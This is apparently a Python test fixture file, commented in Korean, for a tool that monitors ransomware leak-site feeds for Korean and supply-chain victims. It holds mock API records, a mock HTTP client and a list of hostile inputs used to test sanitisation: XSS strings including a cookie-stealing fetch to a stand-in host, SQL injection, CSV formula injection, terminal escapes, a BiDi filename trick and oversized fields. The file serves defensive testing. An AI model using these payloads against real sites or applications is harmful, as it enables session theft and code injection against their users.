"""테스트용 픽스처 — 실제 API 응답 형태 + 악성 페이로드 삽입 케이스."""

# 실제 ransomware.live /v2/countryvictims/KR 응답 형태
RANSOMWARE_LIVE_KR = [
    {
        "activity": "Manufacturing", "country": "KR", "data_size": None,
        "description": "N/A",
        "discovered": "2026-08-10T19:39:24.349878+00:00",
        "group_name": "qilin", "post_title": "SAMPLEMOTOR MOTOR(critical data)",
        "post_url": "http://ijzn3sicrcy7guixkzjkib4ukbiilwc3xhnmby4mcbccnsd7j2rekvqd.onion/site/blog?uuid=42480710",
        "published": "2026-08-10T19:39:03.222188+00:00",
        "ransom": None, "website": "www.samplemotor.co.kr",
    },
    {
        "activity": "Manufacturing", "country": "KR", "data_size": None,
        "description": "Selling fresh full database dumps of Sampleyang Industrial Co., Ltd.",
        "discovered": "2026-08-06T08:32:06.171474+00:00",
        "group_name": "Barracuda",
        "post_title": "Sampleyang Industrial Co., Ltd. \\ SAMPLEYANG SAMPLEX",
        "post_url": "http://darkfoxaqhfpxkrbt7vxns2z2u2k72sgmqbzeorupaiottw3ecm2wgyd.onion/Thread-Selling",
        "published": "2026-08-05T00:00:00+00:00", "ransom": None, "website": "samplenexmo.com",
    },
    {
        "activity": "Technology", "country": "KR", "data_size": None,
        "description": "Sector: Manufacturer of new automotive parts | Revenue: US$ 20,000,000",
        "discovered": "2026-08-04T13:23:14.895318+00:00",
        "group_name": "gunra", "post_title": "sampletube", "post_url": "",
        "published": "2026-08-04T13:23:13.902909+00:00", "ransom": None,
        "website": "sampletube.co.kr",
    },
]

# ★ 악성 입력 케이스 — 살균/방어가 동작하는지 확인
MALICIOUS = [
    {
        "activity": "<script>alert(1)</script>", "country": "KR",
        "description": "<img src=x onerror=alert(document.domain)> &lt;script&gt;alert(2)&lt;/script&gt;",
        "discovered": "2026-08-12T00:00:00+00:00",
        "group_name": "evil'; DROP TABLE victims;--",
        "post_title": "</script><script>fetch('http://evil.tld/'+document.cookie)</script>ACME Korea",
        "post_url": "javascript:alert(1)",
        "published": "2026-08-12T00:00:00+00:00", "website": "evil.co.kr",
    },
    {
        # CSV 인젝션 + 터미널 이스케이프 + BiDi override
        "activity": "Finance", "country": "KR",
        "description": "=cmd|'/c calc'!A1 \x1b[31mRED\x1b[0m ‮gnp.exe",
        "discovered": "2026-08-12T01:00:00+00:00",
        "group_name": "lockbit3", "post_title": "=HYPERLINK(\"http://evil.tld\",\"click\")",
        "post_url": "http://x.onion/a", "published": "", "website": "victim.or.kr",
    },
    {
        # 초대형 필드 (메모리/DoS)
        "activity": "A" * 5000, "country": "KR",
        "description": "B" * 50000, "discovered": "2026-08-12T02:00:00+00:00",
        "group_name": "C" * 500, "post_title": "D" * 3000,
        "post_url": "http://y.onion/", "published": "", "website": "big.kr",
    },
]

# ransomlook.io 형태 (country 없음) — 도메인/키워드 판별 검증용
RANSOMLOOK = [
    {"post_title": "www.samsungfire.com", "discovered": "2026-08-14 10:00:00.000000",
     "description": "system breach", "link": "/blog?uuid=abc", "group_name": "blackwater"},
    {"post_title": "hanmi-pharm.co.kr", "discovered": "2026-08-14 11:00:00.000000",
     "description": "data theft", "link": "", "group_name": "play"},
    {"post_title": "㈜대한테크놀로지", "discovered": "2026-08-14 12:00:00.000000",
     "description": "한국 제조기업 데이터 유출", "link": "", "group_name": "qilin"},
    # 오탐 유발 케이스 — 걸러져야 함
    {"post_title": "Nokia Siemens Networks", "discovered": "2026-08-14 13:00:00.000000",
     "description": "telecom vendor", "link": "", "group_name": "play"},
    {"post_title": "Pyongyang Trading Co", "discovered": "2026-08-14 14:00:00.000000",
     "description": "North Korea based entity", "link": "", "group_name": "handala"},
    {"post_title": "Koreatown Dental Group", "discovered": "2026-08-14 15:00:00.000000",
     "description": "Los Angeles clinic", "link": "", "group_name": "play"},
    {"post_title": "Global Logistics Inc", "discovered": "2026-08-14 16:00:00.000000",
     "description": "Operations across Asia including Korea and Japan", "link": "", "group_name": "akira"},
    # 중복 제거 검증 — ransomware.live 의 samplemotor 과 같은 건
    {"post_title": "www.samplemotor.co.kr", "discovered": "2026-08-10 19:40:00.000000",
     "description": "duplicate of ransomware.live entry", "link": "", "group_name": "qilin"},
]


class MockClient:
    """SafeHttpClient 대역. 네트워크를 타지 않는다."""

    def __init__(self, routes: dict):
        self.routes = routes
        self.calls: list[str] = []

    def get_json(self, url: str):
        self.calls.append(url)
        for key, payload in self.routes.items():
            if key in url:
                return payload
        return []

    def get_bytes(self, url: str) -> bytes:
        raise RuntimeError("이 테스트에서는 호출되지 않아야 합니다")

    def close(self) -> None:
        pass

    def __enter__(self):
        return self

    def __exit__(self, *a):
        pass


# ── 공급망 축 검증용 (한국과 무관하지만 국내로 번질 수 있는 건) ──
SUPPLY_CASES = [
    # 글로벌 핵심 벤더 — country 무관하게 잡혀야 함
    {"activity": "Technology", "country": "US",
     "description": "Managed file transfer software vendor breach",
     "discovered": "2026-08-14T00:00:00+00:00", "group_name": "cl0p",
     "post_title": "Progress Software MOVEit", "post_url": "http://a.onion/1",
     "published": "2026-08-14T00:00:00+00:00", "website": "progress.com"},
    {"activity": "Technology", "country": "US",
     "description": "cloud data warehouse", "discovered": "2026-08-13T00:00:00+00:00",
     "group_name": "shinyhunters", "post_title": "Snowflake Inc", "post_url": "",
     "published": "2026-08-13T00:00:00+00:00", "website": "snowflake.com"},
    {"activity": "Manufacturing", "country": "TW",
     "description": "wafer foundry", "discovered": "2026-08-12T00:00:00+00:00",
     "group_name": "lockbit", "post_title": "TSMC supplier", "post_url": "",
     "published": "2026-08-12T00:00:00+00:00", "website": "tsmc.com"},
    # 해외 기업의 한국 법인
    {"activity": "Manufacturing", "country": "DE",
     "description": "automotive components", "discovered": "2026-08-11T00:00:00+00:00",
     "group_name": "play", "post_title": "Continental Korea Ltd", "post_url": "",
     "published": "2026-08-11T00:00:00+00:00", "website": "sample-korea.com"},
    # 업종 지표만
    {"activity": "Professional Services", "country": "SG",
     "description": "We are a managed service provider for regional enterprises",
     "discovered": "2026-08-10T00:00:00+00:00", "group_name": "akira",
     "post_title": "Acme Regional IT", "post_url": "",
     "published": "2026-08-10T00:00:00+00:00", "website": "acme-it.sg"},
    # ★ 무관 — 잡히면 안 됨
    {"activity": "Retail", "country": "BR",
     "description": "local bakery chain", "discovered": "2026-08-09T00:00:00+00:00",
     "group_name": "play", "post_title": "Padaria Silva", "post_url": "",
     "published": "2026-08-09T00:00:00+00:00", "website": "padariasilva.com.br"},
    # ★ 그룹명이 벤더명과 같은 함정 — 피해자는 무관하므로 잡히면 안 됨
    {"activity": "Retail", "country": "FR",
     "description": "small shop", "discovered": "2026-08-08T00:00:00+00:00",
     "group_name": "Barracuda", "post_title": "Boulangerie Dupont", "post_url": "",
     "published": "2026-08-08T00:00:00+00:00", "website": "dupont-boulangerie.fr"},
    {"activity": "Retail", "country": "IT",
     "description": "shop", "discovered": "2026-08-07T00:00:00+00:00",
     "group_name": "titan", "post_title": "Negozio Rossi", "post_url": "",
     "published": "2026-08-07T00:00:00+00:00", "website": "rossi.it"},
]

VENDORS_JSON = {
    "vendors": [
        {"name": "우리 ERP 공급사", "names": ["Zeta Industrial Systems"],
         "domains": ["zeta-erp.co.kr"], "tier": "핵심", "note": "생산 ERP 원격 유지보수"},
        {"name": "물류 파트너", "names": [], "domains": ["nova-forwarding.com"],
         "tier": "일반", "note": "수출 통관"},
    ]
}

DIRECT_VENDOR_CASE = {
    "activity": "Technology", "country": "VN",
    "description": "ERP vendor", "discovered": "2026-08-15T00:00:00+00:00",
    "group_name": "qilin", "post_title": "Zeta Industrial Systems Co., Ltd.",
    "post_url": "", "published": "2026-08-15T00:00:00+00:00", "website": "zeta-erp.co.kr",
}
